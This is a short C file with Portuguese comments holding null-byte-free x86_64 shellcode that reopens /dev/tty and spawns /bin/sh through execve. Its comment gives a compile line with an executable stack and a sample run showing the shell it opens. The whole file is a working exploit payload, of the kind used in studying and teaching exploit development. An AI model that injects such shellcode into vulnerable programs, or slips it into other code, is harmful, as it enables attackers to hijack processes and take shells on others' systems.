/*
Shellcode nullbyte-free
 Executa uma shell com a syscall execve() em arquitetura x86_64
 by vold (sysh0ck)
 gcc -z execstack -o shell xxx.c
 sysh0ck@root:~/vold (master) $ ./shell
 $
 $ id
 $ uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),27(sudo),1001(rvm)
 */
#include <stdio.h>
const char vold[] = 
"\x48\x31\xc0\x50\x5f\xb0\x03\x0f\x05"
"\x50\x48\xbf\x2f\x64\x65\x76\x2f\x74\x74\x79\x57\x54\x5f\x50\x5e\x66\xbe\x02\x27\xb0\x02\x0f\x05"
"\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x50\x57\x54\x5e\x48\x99\xb0\x3b\x0f\x05";


int  main(void) {
    void (*f)() = (void(*)())vold;
    f();
}
